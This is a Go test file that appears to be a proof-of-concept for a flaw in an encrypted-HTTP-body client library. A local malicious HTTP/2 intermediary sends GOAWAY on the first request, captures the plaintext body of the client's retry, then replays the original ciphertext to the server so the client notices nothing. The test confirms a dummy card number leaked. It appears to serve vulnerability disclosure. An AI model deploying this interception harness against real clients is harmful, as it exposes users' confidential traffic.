package client_test

// verify3: EHBP HEAD (v0.4.0) client, pristine http.DefaultTransport (not
// modified), intermediary cert trusted via SSL_CERT_FILE. LOCAL ONLY.

import (
	"bytes"
	"crypto/tls"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strconv"
	"strings"
	"sync"
	"testing"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"github.com/tinfoilsh/encrypted-http-body-protocol/client"
	"github.com/tinfoilsh/encrypted-http-body-protocol/identity"
)

func TestPoCVerify3_HEAD_GoAwayLeaksPlaintext(t *testing.T) {
	certFile, keyFile := os.Getenv("POC_LEAF_CERT"), os.Getenv("POC_LEAF_KEY")
	if certFile == "" || os.Getenv("SSL_CERT_FILE") == "" {
		t.Skip("needs SSL_CERT_FILE, POC_LEAF_CERT, POC_LEAF_KEY")
	}
	serverID, err := identity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	enclave := httptest.NewServer(serverID.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		w.Write([]byte("enclave decrypted " + strconv.Itoa(len(b)) + " bytes"))
	})))
	defer enclave.Close()

	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		t.Fatal(err)
	}
	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"h2", "http/1.1"}})
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()

	type stream struct {
		hdr  map[string]string
		body bytes.Buffer
	}
	var mu sync.Mutex
	var seen []*stream
	var original *stream
	var alpn []string
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go func() {
				defer c.Close()
				tc := c.(*tls.Conn)
				if tc.Handshake() != nil {
					return
				}
				mu.Lock()
				alpn = append(alpn, tc.ConnectionState().NegotiatedProtocol)
				mu.Unlock()
				pre := make([]byte, len(http2.ClientPreface))
				if _, err := io.ReadFull(tc, pre); err != nil {
					return
				}
				fr := http2.NewFramer(tc, tc)
				fr.ReadMetaHeaders = hpack.NewDecoder(65536, nil)
				var hb bytes.Buffer
				he := hpack.NewEncoder(&hb)
				fr.WriteSettings()
				open := map[uint32]*stream{}
				for {
					f, err := fr.ReadFrame()
					if err != nil {
						return
					}
					var id uint32
					switch f := f.(type) {
					case *http2.SettingsFrame:
						if !f.IsAck() {
							fr.WriteSettingsAck()
						}
					case *http2.MetaHeadersFrame:
						s := &stream{hdr: map[string]string{}}
						for _, hf := range f.Fields {
							s.hdr[hf.Name] = hf.Value
						}
						open[f.StreamID] = s
						if f.StreamEnded() {
							id = f.StreamID
						}
					case *http2.DataFrame:
						if s := open[f.StreamID]; s != nil {
							s.body.Write(f.Data())
							if n := uint32(len(f.Data())); n > 0 {
								fr.WriteWindowUpdate(0, n)
								fr.WriteWindowUpdate(f.StreamID, n)
							}
							if f.StreamEnded() {
								id = f.StreamID
							}
						}
					}
					if id == 0 {
						continue
					}
					s := open[id]
					mu.Lock()
					seen = append(seen, s)
					first := original == nil
					if first {
						original = s
					}
					fwd := original
					mu.Unlock()
					if first {
						fr.WriteGoAway(0, http2.ErrCodeNo, nil) // graceful shutdown: client retries elsewhere
						continue
					}
					up, _ := http.NewRequest("POST", enclave.URL+s.hdr[":path"], bytes.NewReader(fwd.body.Bytes()))
					up.Header.Set("Ehbp-Encapsulated-Key", fwd.hdr["ehbp-encapsulated-key"])
					ur, err := (&http.Client{Transport: &http.Transport{}}).Do(up)
					if err != nil {
						return
					}
					ub, _ := io.ReadAll(ur.Body)
					ur.Body.Close()
					hb.Reset()
					he.WriteField(hpack.HeaderField{Name: ":status", Value: strconv.Itoa(ur.StatusCode)})
					he.WriteField(hpack.HeaderField{Name: "ehbp-response-nonce", Value: ur.Header.Get("Ehbp-Response-Nonce")})
					fr.WriteHeaders(http2.HeadersFrameParam{StreamID: id, BlockFragment: hb.Bytes(), EndHeaders: true})
					fr.WriteData(id, true, ub)
				}
			}()
		}
	}()

	pub, _ := identity.FromPublicKeyHex(serverID.MarshalPublicKeyHex())
	tr, err := client.NewTransportWithIdentity(pub) // no options => http.DefaultTransport
	if err != nil {
		t.Fatal(err)
	}
	secret := "CONFIDENTIAL body for EHBP HEAD: account 4111-1111-1111-1111"
	req, _ := http.NewRequest(http.MethodPost, "https://"+ln.Addr().String()+"/secure", bytes.NewBufferString(secret))
	resp, err := (&http.Client{Transport: tr}).Do(req)
	if err != nil {
		t.Fatal(err)
	}
	got, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	t.Logf("client: %s %s decrypted=%q", resp.Proto, resp.Status, got)
	mu.Lock()
	defer mu.Unlock()
	t.Logf("ALPN per TLS connection: %v", alpn)
	leaked := false
	for i, s := range seen {
		t.Logf("intermediary stream#%d ehbp-key-present=%v body(%dB)=%q", i, s.hdr["ehbp-encapsulated-key"] != "", s.body.Len(), s.body.String())
		if strings.Contains(s.body.String(), "4111-1111-1111-1111") {
			leaked = true
		}
	}
	if !leaked {
		t.Fatal("no plaintext seen")
	}
	t.Log("RESULT: EHBP HEAD client leaked plaintext on HTTP/2 GOAWAY retry; client call succeeded")
}
